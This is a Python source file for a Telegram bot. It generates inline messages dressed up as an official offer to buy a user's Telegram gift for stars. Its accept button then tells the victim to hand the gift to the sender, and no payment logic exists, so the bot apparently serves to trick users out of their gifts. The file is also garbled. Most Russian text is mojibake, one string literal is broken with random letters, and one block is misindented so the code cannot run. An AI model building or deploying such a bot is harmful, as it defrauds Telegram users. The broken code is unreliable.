import asyncio
import os
import re
from urllib.parse import urlparse
from html import escape
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    CallbackQuery,
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.getenv("PORT", "10000"))

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

def format_stars(value: int) -> str:
    return f"{value:,}".replace(",", " ")


def parse_offer(text: str):
    urls = re.findall(r"https?://t\.me/[^\s]+", text)
    if not urls:
        return None

    url = urls[0].rstrip(".,!?")
    after_url = text[text.find(url) + len(url):]
    numbers = re.findall(r"\b\d+(?:[.,]\d+)?\b", after_url)

    if not numbers:
        return None

    try:
        price = int(float(numbers[-1].replace(",", ".")))
    except ValueError:
        return None

    if price <= 0:
        return None

    return url, price


def extract_gift_info(url: str):
    path = urlparse(url).path.strip("/")
    parts = path.split("/")

    gift_name = "ÐÐ¾Ð´Ð°ÑÐ¾Ðº"
    gift_number = ""

    if parts:
        last = parts[-1]
        match = re.match(r"(.+?)-(\d+)$", last)

        if match:
            gift_name = match.group(1).replace("_", " ")
            gift_number = f"#{match.group(2)}"
        else:
            gift_name = last.replace("_", " ")

    return gift_name, gift_number


def make_keyboard(url: str, offer_id: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="показать подарок",
                    url=url,
                )
            ],
            [
                InlineKeyboardButton(
                    text="отказано",
                    callback_data=f"decline:{offer_id}",
                ),
                InlineKeyboardButton(
                    text="принять",
                    callback_data=f"accept:{offer_id}",
                ),
            ],
        ]
    )


@dp.message(CommandStart())
async def start_handler(message):
    await message.answer(
        "eiooyc sgubbb qwexxg
        Ð¿ÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ, Ð¸ÑÐ¿Ð¾Ð»ÑÐ·ÑÐ¹ inline-ÑÐµÐ¶Ð¸Ð¼ Ð±Ð¾ÑÐ°.\n\n"
        "ÐÑÐ¸Ð¼ÐµÑ:\n"
        "<code>@Ð¸Ð¼Ñ_Ð±Ð¾ÑÐ° https://t.me/example 1200</code>\n\n"
        "ÐÐ¾ÑÐ»ÐµÐ´Ð½ÐµÐµ ÑÐ¸ÑÐ»Ð¾ â ÑÐµÐ½Ð° Ð¿ÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ Ð² â­."
    )


@dp.inline_query()
async def inline_handler(query: InlineQuery):
    parsed = parse_offer(query.query)

    if not parsed:
        await query.answer(
            results=[],
            cache_time=0,
            is_personal=True,
        )
        return

    url, price = parsed
    gift_name, gift_number = extract_gift_info(url)
    formatted_price = format_stars(price)
    number_text = f" {gift_number}" if gift_number else ""

message_text = (
    "🟡 <b>Пользовательское предложение</b>\n\n"
    f"🎁 <b>{escape(gift_name)}{escape(number_text)}</b>\n\n"
    f"Предложение о покупке этого подарка за "
    f"<b>{formatted_price} ⭐</b>\n\n"
    "⏳ Предложение действительно ограниченное время."
)

    offer_id = str(abs(hash(
        f"{query.from_user.id}:{url}:{price}"
    )))[:10]

    result = InlineQueryResultArticle(
        id=offer_id,
        title=f"ÐÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ â {formatted_price} â­",
        description=f"{gift_name}{number_text} â¢ {formatted_price} â­",
        input_message_content=InputTextMessageContent(
            message_text=message_text,
        ),
        reply_markup=make_keyboard(url, offer_id),
    )

    await query.answer(
        results=[result],
        cache_time=0,
        is_personal=True,
    )


@dp.callback_query(F.data.startswith("accept:"))
async def accept_handler(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    await callback.answer()

    await callback.message.edit_text(
        callback.message.text
        + "\n\n"
        "â <b>ÐÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð¿ÑÐ¸Ð½ÑÑÐ¾</b>\n\n"
        "Ð§ÑÐ¾Ð±Ñ Ð¿Ð¾Ð»ÑÑÐ¸ÑÑ ÑÐºÐ°Ð·Ð°Ð½Ð½Ð¾Ðµ ÐºÐ¾Ð»Ð¸ÑÐµÑÑÐ²Ð¾ â­, "
        "Ð¿ÐµÑÐµÐ´Ð°Ð¹ÑÐµ Ð¿Ð¾Ð´Ð°ÑÐ¾Ðº Ð¾ÑÐ¿ÑÐ°Ð²Ð¸ÑÐµÐ»Ñ Ð¿ÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="ð ÐÐµÑÐµÐ´Ð°ÑÑ Ð¿Ð¾Ð´Ð°ÑÐ¾Ðº",
                        callback_data=f"transfer:{offer_id}",
                    )
                ]
            ]
        ),
    )


@dp.callback_query(F.data.startswith("transfer:"))
async def transfer_handler(callback: CallbackQuery):
    await callback.answer(
        "ÐÐµÑÐµÐ´Ð°ÑÐ° Ð²ÑÐ¿Ð¾Ð»Ð½ÑÐµÑÑÑ Ð²ÑÑÑÐ½ÑÑ ÑÐµÑÐµÐ· Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐµ ÑÑÐ½ÐºÑÐ¸Ð¸ Telegram.",
        show_alert=True,
    )


@dp.callback_query(F.data.startswith("decline:"))
async def decline_handler(callback: CallbackQuery):
    await callback.answer()

    await callback.message.edit_text(
        callback.message.text
        + "\n\n"
        "â <b>ÐÑÐµÐ´Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð¾ÑÐºÐ»Ð¾Ð½ÐµÐ½Ð¾</b>"
    )


async def health(request):
    return web.Response(text="OK")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health)

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(
        runner,
        "0.0.0.0",
        PORT,
    )
    await site.start()


async def main():
    await start_web_server()
    print("Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
